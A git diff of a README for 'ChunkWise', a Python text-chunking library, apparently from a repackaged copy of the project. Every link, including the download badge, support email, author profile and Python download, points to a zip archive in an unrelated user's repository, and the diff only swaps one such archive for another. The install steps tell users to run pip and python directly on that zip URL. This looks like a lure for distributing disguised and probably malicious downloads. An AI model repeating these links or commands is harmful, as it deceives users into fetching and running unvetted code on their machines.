@@ -1,6 +1,6 @@
 # 🚀 ChunkWise - Effortless Text Chunking for All
 
-[![Download ChunkWise](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip)](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip)
+[![Download ChunkWise](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip)](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip)
 
 ## 📖 Description
 
@@ -11,8 +11,8 @@ ChunkWise is a Python library designed to simplify text chunking for both Arabic
 **Hesham Haroon**
 
 For support, questions, or commercial licensing inquiries:  
-- Email: [https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip)  
-- GitHub: [@h9-tec](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip)
+- Email: [https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip)  
+- GitHub: [@h9-tec](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip)
 
 ## 🌟 Features
 
@@ -29,7 +29,7 @@ Follow these simple steps to download and use ChunkWise:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the download page.  
-   [Visit this page to download ChunkWise](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip)
+   [Visit this page to download ChunkWise](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see various versions of ChunkWise. Look for the latest stable release.
@@ -41,26 +41,26 @@ Follow these simple steps to download and use ChunkWise:
    Once the download is complete, locate the file on your computer. Right-click the file and choose "Extract All" if it is a zip file. Follow the prompts to extract the files to a folder of your choice.
 
 5. **Install Required Packages**  
-   To run ChunkWise, you need to have Python installed on your computer. If you don’t have it, download it from [https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip).
+   To run ChunkWise, you need to have Python installed on your computer. If you don’t have it, download it from [https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip).
 
    After installing Python, open your command prompt or terminal and run the following command to install any required packages:
 
    ```bash
-   pip install -r https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip
+   pip install -r https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip
    ```
 
 6. **Run ChunkWise**  
    After installation, navigate to the folder where you extracted ChunkWise via your command prompt or terminal. Use the following command to run the application:
 
    ```bash
-   python https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip
+   python https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip
    ```
 
 ## 📥 Download & Install
 
 You can download ChunkWise by visiting the following link:
 
-[Download ChunkWise](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/embeddings/Wise-Chunk-2.5.zip)
+[Download ChunkWise](https://raw.githubusercontent.com/hasibul0912/ChunkWise/main/chunkwise/utils/Wise_Chunk_3.7.zip)
 
 Make sure to follow the steps listed in the "Getting Started" section for a smooth installation process.
 
